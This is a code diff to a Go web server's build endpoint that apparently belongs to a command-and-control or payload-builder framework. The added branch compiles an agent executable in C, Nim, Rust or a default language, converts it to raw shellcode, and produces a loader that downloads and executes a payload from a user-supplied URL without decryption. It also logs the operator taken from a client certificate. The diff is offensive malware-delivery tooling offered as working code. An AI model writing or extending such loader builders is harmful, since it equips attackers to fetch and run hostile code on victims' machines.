@@ -1284,6 +1284,46 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		result["html"] = htmlPath
 
+	case cfg.Format == "loader" && cfg.RawPayload:
+		// Raw mode: build shellcode (.bin) without encryption, bake user-supplied URL
+		if cfg.PayloadURL == "" {
+			jsonErr(w, "payload_url required for raw_payload=true", http.StatusBadRequest)
+			return
+		}
+		var exePath string
+		var err error
+		switch cfg.Lang {
+		case "c":
+			exePath, err = BuildCAgentEXE(cfg, payloadsDir)
+		case "nim":
+			exePath, err = BuildNimEXE(cfg, payloadsDir)
+		case "rust":
+			exePath, err = BuildRustEXE(cfg, payloadsDir)
+		default:
+			exePath, err = BuildEXE(cfg, payloadsDir)
+		}
+		if err != nil {
+			jsonErr(w, "build exe: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		binPath, err := BuildRAW(exePath, payloadsDir)
+		if err != nil {
+			jsonErr(w, "build shellcode: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		// Raw loader: XORKey="" → loader downloads and executes without decryption
+		loaderPath, err := BuildLoader(cfg, cfg.PayloadURL, "", deliveryDir)
+		if err != nil {
+			jsonErr(w, "build loader: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		op := operatorFromCert(r)
+		s.printf("[%s] build raw loader: url=%s\n", op, cfg.PayloadURL)
+		result["loader"] = loaderPath
+		result["bin"] = binPath
+		jsonOK(w, result)
+		return
+
 	case cfg.Format == "loader":
 		if cfg.StageURL == "" {
 			jsonErr(w, "stage-url required for format=loader", http.StatusBadRequest)
